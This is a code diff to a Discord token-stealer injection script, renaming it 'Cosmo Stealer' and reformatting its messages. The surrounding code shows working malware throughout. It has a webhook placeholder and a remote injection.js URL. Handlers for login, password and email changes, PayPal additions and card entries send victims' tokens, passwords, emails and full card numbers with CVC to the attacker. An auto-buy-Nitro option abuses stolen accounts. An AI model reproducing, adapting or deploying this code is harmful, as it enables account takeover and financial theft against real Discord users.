@@ -8,13 +8,13 @@ const config = {
   auto_buy_nitro: true, 
   ping_on_run: false,
   ping_val: "@everyone",
-  embed_name: "Discord Injection", 
+  embed_name: "Cosmo Stealer", 
   embed_icon:
     "https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png".replace(
       / /g,
       "%20",
     ), 
-  embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
+  embed_color: 8363488,
   webhook: "%WEBHOOK%", 
   injection_url: "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js", 
   api: "https://discord.com/api/v9/users/@me",
@@ -262,9 +262,9 @@ const getNitro = (flags) => {
     case 0:
       return "No Nitro";
     case 1:
-      return "Nitro Classic";
+      return "<a:classic:964268257584500806>";
     case 2:
-      return "Nitro Boost";
+      return "<a:r_Nitroclassic_cdf:937312424552460288>";
     default:
       return "No Nitro";
   }
@@ -346,7 +346,7 @@ const login = async (email, password, token) => {
           },
           {
             name: "**Token**",
-            value: `\`${token}\``,
+            value: `\```${token}\```,
             inline: false,
           },
         ],
@@ -355,7 +355,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Discord Token Grabber made by hax 🌙#0001 and tatsu#9632",
+          text: "Cosmo Stealer",
         },
       },
     ],
@@ -388,7 +388,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           },
           {
             name: "**Token**",
-            value: `\`${token}\``,
+            value: `\```${token}\```,
             inline: false,
           },
         ],
@@ -397,7 +397,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Discord Token Grabber made by hax 🌙#0001 and tatsu#9632",
+          text: "Cosmo Stealer",
         },
       },
     ],
@@ -430,7 +430,7 @@ const emailChanged = async (email, password, token) => {
           },
           {
             name: "**Token**",
-            value: `\`${token}\``,
+            value: `\```${token}\```,
             inline: false,
           },
         ],
@@ -439,7 +439,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Discord Token Grabber made by hax 🌙#0001 and tatsu#9632",
+          text: "Cosmo Stealer",
         },
       },
     ],
@@ -472,7 +472,7 @@ const PaypalAdded = async (token) => {
           },
           {
             name: "**Token**",
-            value: `\`${token}\``,
+            value: `\```${token}\```,
             inline: false,
           },
         ],
@@ -481,7 +481,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Discord Token Grabber made by hax 🌙#0001 and tatsu#9632",
+          text: "Cosmo Stealer",
         },
       },
     ],
@@ -514,7 +514,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
           {
             name: "**Token**",
-            value: `\`${token}\``,
+            value: `\```${token}\```,
             inline: false,
           },
         ],
@@ -523,7 +523,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Discord Token Grabber made by hax 🌙#0001 and tatsu#9632",
+          text: "Cosmo Stealer",
         },
       },
     ],
@@ -558,7 +558,7 @@ const nitroBought = async (token) => {
           },
           {
             name: "**Token**",
-            value: `\`${token}\``,
+            value: `\```${token}\```,
             inline: false,
           },
         ],
@@ -567,7 +567,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Discord Token Grabber made by hax 🌙#0001 and tatsu#9632",
+          text: "Cosmo Stealer",
         },
       },
     ],
